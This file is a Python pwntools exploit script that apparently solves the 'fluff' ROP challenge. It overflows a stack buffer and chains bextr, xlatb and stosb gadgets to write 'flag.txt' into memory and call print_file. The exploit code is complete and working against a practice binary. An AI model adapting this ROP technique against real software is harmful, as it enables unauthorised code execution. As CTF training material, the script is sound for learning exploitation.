#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./fluff')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


GADGET_bextr = 0x40062A
GADGET_xlatb = 0x400628
GADGET_stosb = 0x400639
GADGET_pop_rdi = 0x4006a3

DATA_SECTION_BUFF = 0x601800

CHAR_POS = {}
for c in b'flag.txt':
	CHAR_POS[c] = next(exe.search(bytes([c])))


def set_rbx(val):
    num_bits = 64
    start_bits = 0
    src2 = num_bits << 8 | start_bits
    src1 = val - 0x3EF2
    return [GADGET_bextr, src2, src1]

CURRENT_AL = 11
def set_al(charval):
    global CURRENT_AL
    target_addr = CHAR_POS[charval] - CURRENT_AL
    CURRENT_AL = charval
    return set_rbx(target_addr) + [GADGET_xlatb]

def store_memory(addr, bs):
    buf = []
    buf += [GADGET_pop_rdi, addr]
    for c in bs:
        buf += set_al(c)
        buf += [GADGET_stosb]
    return buf

r = start()

buf = b'X' * 32 + b'SAVEDRBP'
buf += flat(
    store_memory(DATA_SECTION_BUFF, b'flag.txt') + 
    [GADGET_pop_rdi, DATA_SECTION_BUFF, 0x400620, b'DONEDONE', b'ABCDEFGH'] # call print_file(DATA_SECTION_BUFF))
    )
assert len(buf) <= 0x200

#gdb.attach(r)
r.sendlineafter('solutions...\n> ', buf)
r.interactive()